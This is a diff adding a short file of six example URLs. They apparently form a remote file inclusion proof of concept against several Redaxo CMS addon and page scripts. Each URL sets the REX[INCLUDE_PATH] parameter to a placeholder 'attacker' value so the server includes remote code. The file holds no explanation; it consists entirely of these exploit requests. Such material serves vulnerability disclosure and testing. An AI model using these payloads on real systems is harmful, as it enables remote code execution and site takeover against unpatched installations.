@@ -1,0 +1,11 @@
+http://www.example.com/redaxo/include/addons/image_resize/pages/index.inc.php?REX[INCLUDE_PATH]=attacker
+
+http://www.example.com/redaxo3_0_demos_patched/redaxo/include/addons/image_resize/pages/index.inc.php?subpage=relations&REX[INCLUDE_PATH]=attacker
+
+http://www.example.com/redaxo3_0_demos_patched/redaxo/include/addons/simple_user/pages/index.inc.php?REX[INCLUDE_PATH]=attacker
+
+http://www.example.com/redaxo3_0_demos_patched/redaxo/include/addons/stats/pages/index.inc.php?REX[INCLUDE_PATH]=attacker
+
+http://www.example.com/redaxo/include/addons/import_export/pages/index.inc.php?REX[INCLUDE_PATH]=attacker
+
+http://www.example.com/redaxo/include/pages/community.inc.php?subpage=newsletter&REX[INCLUDE_PATH]=attacker
